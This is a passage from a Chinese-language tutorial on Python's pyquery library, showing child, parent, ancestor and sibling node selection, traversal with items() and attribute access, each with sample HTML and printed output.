class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里我们先选取class为list节点，然后调用find()方法，传入CSS选择器，选取其内部的li节点，最后打印输出</p><p>find()方法会将符合条件的所有节点选择出来</p><p>查找范围是节点的所有子孙节点，而如果我们只想查找子节点，那么可以用children()方法</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lis</span>=items.children()</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(<span class="keyword">lis</span>))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">lis</span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;first item&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;second item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">"bold"</span>&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;fourth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;fifth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br></pre></td></tr></table></figure><p>如果要筛选所有子节点中符合条件的节点，例如筛选出子节点中class为active的节点，可以向children()方法传入CSS选择器.active:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lis=items.children(<span class="string">'.active'</span>)</span><br><span class="line">print(lis)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h3 id="父节点"><a href="#父节点" class="headerlink" title="父节点"></a>父节点</h3><p>我们可以用parent()方法来获取某个节点的父节点<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc('.list')</span><br><span class="line">container = items.parent()</span><br><span class="line">print(type(container))</span><br><span class="line">print(container)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里首先用.list选取class为list的节点，然后调用parent()方法得到其父节点</p><p>这里的父节点是该节点的直接父节点，也就是说它不会再去查找父节点的父节点，即祖先节点</p><p>如果想要获取祖先节点，可以用parents()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc(<span class="string">'.list'</span>)</span><br><span class="line">parents = items.parents()</span><br><span class="line">print(type(parents))</span><br><span class="line">print(parents)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">pyquery</span>.<span class="title">pyquery</span>.<span class="title">PyQuery</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span></span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br><span class="line"> &lt;<span class="regexp">/div&gt;&lt;div id="container"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul class="list"&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-0"&gt;first item&lt;/</span>li&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以看到有两个，一个是class为wrap的节点，一个是id为container的节点，也就是说parents()方法会返回所有的祖先节点</p><p>如果想要筛选某个祖先节点的话，可以向parents()方法传入CSS选择器，这样就会返回祖先节点中CSS选择器的节点：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">parents = items.parents(<span class="string">'.wrap'</span>)</span><br><span class="line">print(parents)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"wrap"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"container"</span>&gt;</span><br><span class="line">        &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>div&gt;</span><br><span class="line"> &lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><br>这样就只会输出wrap这个祖先节点了</p><h3 id="兄弟节点"><a href="#兄弟节点" class="headerlink" title="兄弟节点"></a>兄弟节点</h3><p>如果想要查询兄弟节点，那就可以使用siblings()方法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.list .item-0.active'</span>)</span><br><span class="line">print(li.siblings())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;first item&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">             &lt;li class="item-1 active"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>item-0的兄弟节点有4个，所以输出了所有满足条件的li节点</p><p>如果想要筛选某个兄弟节点，只需传入CSS选择器<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.list .item-0.active'</span>)</span><br><span class="line">print(li.siblings(<span class="string">'.active'</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>这里就只输出的class为active的节点</p><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>对于单个节点来说，可以直接打印输出，也可以直接转成字符串：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">li = doc(<span class="string">'.item-0.active'</span>)</span><br><span class="line">print(li)</span><br><span class="line">print(str(li))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">             </span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>多个节点的结果，就需要遍历来获取了，我们需要调用items()方法<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pyquery import PyQuery <span class="keyword">as</span> pq</span><br><span class="line">doc = pq(html)</span><br><span class="line"><span class="keyword">lis</span> = doc('<span class="keyword">li</span>').items()</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(<span class="keyword">lis</span>))</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">li</span> <span class="keyword">in</span> <span class="keyword">lis</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">li</span>, <span class="keyword">type</span>(<span class="keyword">li</span>))</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="keyword">class</span> 'generator'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;first item&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;second item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">"bold"</span>&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;fourth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">              &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;fifth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">          &lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br></pre></td></tr></table></figure><br>调用items()方法后，会得到一个生成器，遍历一下，就可以逐个得到li节点对象了</p><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h3 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h3><p>提到属性，基本上就与前面的一样使用attrs之类的方法，pyquery也不例外，使用attr()方法来获取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">a = doc('.item-0.active a')</span><br><span class="line">print(a, type(a))</span><br><span 